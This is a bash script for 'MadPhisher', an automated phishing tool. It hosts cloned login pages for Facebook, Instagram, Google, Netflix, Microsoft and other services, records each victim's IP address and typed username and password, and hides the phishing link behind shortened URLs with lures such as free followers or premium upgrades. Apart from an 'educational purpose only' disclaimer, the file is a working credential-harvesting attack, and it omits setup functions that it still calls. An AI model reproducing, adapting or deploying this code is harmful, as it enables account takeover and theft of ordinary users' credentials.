#!/bin/bash

##   MadPhisher : 	Automated Phishing Tool
##   Author 	: 	Dashmeet Singh
##   Version 	: 	2.1
##   Github 	: 	https://github.com/dashmeet2023

__version__="2.1"

# [Other parts remain unchanged, skipping unchanged setup for brevity]

## Banner
banner() {
	cat <<- EOF
	
	
${RED}                                                 💥
${PURPLE}                              
${PURPLE}            █▀▄▀█ ▄▀█ █▀▄ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█
${PURPLE}            █░▀░█ █▀█ █▄▀ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄ 
                     
                        ${RED}Version : ${__version__}

 ${GREEN} ➤ Tool Created by Dashmeet Singh
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
 ${GREEN}                                      
 ${GREEN}█▀▄▀█ ▄▀█ █▀▄ █▀█ █░█ █ █▀ █░█ █▀▀ █▀█
 ${GREEN}█░▀░█ █▀█ █▄▀ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄${RED} ${__version__}
	EOF
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED} Author   ${RED}:  ${BLUE}Dashmeet Singh  ${RED}
		${RED} Github   ${RED}:  ${BLUE}https://github.com/dashmeet2023
		${RED} Version  ${RED}:  ${BLUE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose only ${RED}!
		${WHITE}${CYAN} Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${RED} Main Menu     ${RED}[${WHITE}99${RED}]${RED} Exit

	EOF

	read -p "${BLUE}(★★) Select an option : ${GREEN}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}


## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${BLUE} Do You Want A Custom Port ${WHITE}[${GREEN}y${WHITE}/${GREEN}N${WHITE}]: ${GREEN}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Your Custom 4-digit Port [1024-9999] : ${GREEN}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${GREEN}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${RED}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${GREEN}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${GREEN}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${RED}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Waiting for Next Login Info, ${GREEN}Ctrl + C ${RED}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Waiting for Login Info, ${GREEN}Ctrl + C ${RED}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}▄︻デ══━一💥${WHITE} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}▄︻デ══━一💥${WHITE} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}



## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${WHITE} LOCALHOST

	EOF

	read -p "${BLUE}(★★) Enter ${RED}[Madphisher] ${BLUE}for  port forwarding service : ${GREEN}"

	case $REPLY in 
		Madphisher | madphisher)
			start_localhost;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[?]${GREEN} Do you want to change Mask URL? ${ORANGE}[${BLUE}y${ORANGE}/${BLUE}N${ORANGE}] :${GREEN} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${GREEN}(${BLUE}Example: https://get-free-followers.com${GREEN})\n"
		read -e -p "${BLUE} ➤ ${BLUE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${RED} Traditional Login Page
		${RED}[${WHITE}02${RED}]${RED} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${RED} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${RED} Facebook Messenger Login Page

	EOF

	read -p "${BLUE}(★★) Select an option : ${GREEN}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${RED}Traditional Login Page
		${RED}[${WHITE}02${RED}]${RED}Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${RED}1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${RED}Blue Badge Verify Login Page

	EOF

	read -p "${BLUE}(★★) Select an option : ${GREEN}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${RED} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${RED} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${RED} Advanced Voting Poll

	EOF

	read -p "${BLUE}(★★) Select an option : ${GREEN}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${PURPLE}(×_×)${BLUE}Select An Attack For Your Victim ${RED}${BLUE}

		${RED}[${WHITE}01${RED}]${YELLOW} Facebook      ${RED}[${WHITE}02${RED}]${YELLOW} Instagram      ${RED}[${WHITE}03${RED}]${YELLOW} Google   
${RED}[${WHITE}04${RED}]${YELLOW} Twitter       ${RED}[${WHITE}05${RED}]${YELLOW} Snapchat       ${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
		${RED}[${WHITE}07${RED}]${YELLOW} Microsoft     ${RED}[${WHITE}08${RED}]${YELLOW} Spotify        ${RED}[${WHITE}09${RED}]${YELLOW} Netflix 
		${RED}[${WHITE}10${RED}]${YELLOW} Adobe         ${RED}[${WHITE}11${RED}]${YELLOW} Tiktok         ${RED}[${WHITE}12${RED}]${YELLOW} DropBox
		${RED}[${WHITE}99${RED}]${YELLOW} About
		${RED}[${WHITE}00${RED}]${YELLOW} Exit
	EOF
	
	read -p  "${BLUE}(★★) ${BLUE}Select an option : ${GREEN}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
	    3 | 03)
			site_gmail;;
		4 | 04)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		5 | 05)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		6 | 06)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
        7 | 07)
			website="Microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		8 | 08)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		9 | 09)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		10)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		11)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		12)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_cloudflared
install_localxpose
main_menu
